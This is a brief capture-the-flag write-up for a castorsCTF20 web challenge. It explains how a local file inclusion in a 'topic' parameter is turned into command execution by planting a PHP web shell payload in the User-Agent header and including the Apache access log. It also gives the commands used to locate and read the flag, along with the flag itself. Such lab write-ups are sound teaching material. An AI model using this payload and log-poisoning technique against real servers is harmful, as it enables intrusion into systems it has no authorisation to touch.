---
type: "post"
title: "Bane castorsCTF20 - Art"
author: "tozkoparan (Ahmed Selim Üzüm)"
tags: ["writeup", "web", "castorsCTF20"]
---

<!--more-->
When we inspect the site we can see it uses `topic` param for getting the topig.
And it looks like it includes the topic file. But can we use it for LFI? YES!
We can test it with setting `topic` to `/etc/passwd`.

With changing our user agent to `<?php system($_GET['cmd']);?>` and reading
`/var/log/apache2/access.log` file we can execute any command we want using
`CMD` param. Then with setting `CMD` to `ls -Rla` we can see flag is inside
`/home/falg/flag/test/why/the/hassle/right/flag.txt`. And changing `CMD` to
`cat /home/falg/flag/test/why/the/hassle/right/flag.txt` we can get the flag

**Flag:** `castorsCTF{w3lc0m3_2_D4_s0urc3_YoUng_Ju4n}`
